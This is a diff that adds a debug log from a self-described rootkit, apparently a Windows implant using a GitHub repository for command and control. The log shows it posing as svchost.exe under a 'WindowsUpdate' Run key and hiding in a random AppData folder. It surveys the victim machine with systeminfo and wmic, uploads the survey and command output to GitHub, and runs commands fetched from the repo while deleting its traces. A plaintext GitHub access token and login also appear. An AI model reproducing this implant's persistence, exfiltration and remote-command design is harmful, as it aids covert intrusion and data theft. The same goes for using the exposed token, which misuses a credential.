@@ -1,0 +1,65 @@
+Tue Jul 27 18:03:50 2021. Initialisation of the log file.
+
+DEBUG: Tue Jul 27 18:03:50 2021: GithubLogin: hidemepls785
+DEBUG: Tue Jul 27 18:03:50 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Tue Jul 27 18:03:50 2021: GihubAccessToken: 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
+DEBUG: Tue Jul 27 18:03:50 2021: Rootkit Name: VaubanPreprod
+DEBUG: Tue Jul 27 18:03:50 2021: Rootkit Registry Key: Sensors
+DEBUG: Tue Jul 27 18:03:50 2021: Run Registry Key Name: WindowsUpdate
+DEBUG: Tue Jul 27 18:03:50 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Tue Jul 27 18:03:51 2021: The folder list for random folder is not empty. Its size is: 2455
+DEBUG: Tue Jul 27 18:03:51 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO
+DEBUG: Tue Jul 27 18:03:51 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Tue Jul 27 18:03:52 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:53 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:53 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:03:53 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Tue Jul 27 18:03:54 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:54 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:03:54 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Tue Jul 27 18:03:55 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:55 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:03:55 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Tue Jul 27 18:03:56 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:56 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:03:56 2021: The file that will be read weight: 4568
+DEBUG: Tue Jul 27 18:03:56 2021: Success to read the binary file. This number of bytes have been read: 4569
+DEBUG: Tue Jul 27 18:03:56 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Tue Jul 27 18:03:56 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:58 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\systeminfo.txt
+DEBUG: Tue Jul 27 18:03:58 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:03:58 2021: The file that will be read weight: 134
+DEBUG: Tue Jul 27 18:03:58 2021: Success to read the binary file. This number of bytes have been read: 135
+DEBUG: Tue Jul 27 18:03:58 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Tue Jul 27 18:03:58 2021: Start of the method writeFileWindowsApi.
+DEBUG: Tue Jul 27 18:03:58 2021: The content size that will be written: 4947
+DEBUG: Tue Jul 27 18:03:58 2021: Success to write the content(number of bytes : 4947) in the file : C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\sophie-survey.txt
+DEBUG: Tue Jul 27 18:03:58 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Tue Jul 27 18:03:58 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\sophie-survey.txt
+DEBUG: Tue Jul 27 18:03:58 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:03:58 2021: The file that will be read weight: 4947
+DEBUG: Tue Jul 27 18:03:58 2021: Success to read the binary file. This number of bytes have been read: 4948
+DEBUG: Tue Jul 27 18:03:58 2021: The files sophie-survey.txt has been uploaded successfully in the github repo
+DEBUG: Tue Jul 27 18:03:58 2021: Success deleting the survey file.
+DEBUG: Tue Jul 27 18:03:58 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Tue Jul 27 18:03:59 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Tue Jul 27 18:03:59 2021: Success to check the commands with rootkit_path1
+DEBUG: Tue Jul 27 18:03:59 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Tue Jul 27 18:03:59 2021: Start to treat the commands sent by the github repo.
+DEBUG: Tue Jul 27 18:03:59 2021: Command received: execute_cmd
+DEBUG: Tue Jul 27 18:03:59 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\target_command.log
+DEBUG: Tue Jul 27 18:04:04 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Tue Jul 27 18:04:04 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Tue Jul 27 18:04:04 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\target_command.log
+DEBUG: Tue Jul 27 18:04:04 2021: The file will be read as a ANSI file.
+DEBUG: Tue Jul 27 18:04:04 2021: The file that will be read weight: 1044
+DEBUG: Tue Jul 27 18:04:04 2021: Success to read the binary file. This number of bytes have been read: 1045
+DEBUG: Tue Jul 27 18:04:04 2021: The files C:\Users\sophie\AppData\Local\Microsoft\input\ro-RO\target_command.log has been uploaded successfully in the github repo
+DEBUG: Tue Jul 27 18:04:04 2021: Success to delete the file that contains the output of the command.
+DEBUG: Tue Jul 27 18:04:04 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Tue Jul 27 18:04:04 2021: #####################################################
+
+DEBUG: Tue Jul 27 18:04:04 2021: Start of GithubCommunication::sendResults
+DEBUG: Tue Jul 27 18:04:06 2021: The results was uploaded on the github repo
+DEBUG: Tue Jul 27 18:04:06 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Tue Jul 27 18:04:06 2021: Start of GithubCommunication::sendLogs
